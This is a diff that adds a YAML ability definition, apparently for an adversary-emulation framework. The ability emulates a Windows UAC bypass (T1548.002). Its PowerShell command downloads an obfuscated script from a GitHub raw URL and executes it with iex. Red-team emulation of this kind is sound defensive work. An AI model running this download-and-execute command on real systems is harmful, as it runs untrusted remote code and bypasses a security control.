@@ -1,0 +1,17 @@
+---
+- id: b473176c321f31824c909c73807caf92
+  name: WinPwn - UAC Bypass DccwBypassUAC technique
+  description: UAC Bypass DccwBypassUAC technique via function of WinPwn
+  tactic: privilege-escalation
+  technique:
+    attack_id: T1548.002
+    name: 'Abuse Elevation Control Mechanism: Bypass User Account Control'
+  platforms:
+    windows:
+      psh:
+        command: iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/dccuac.ps1')
+        payloads: []
+        cleanup: ''
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
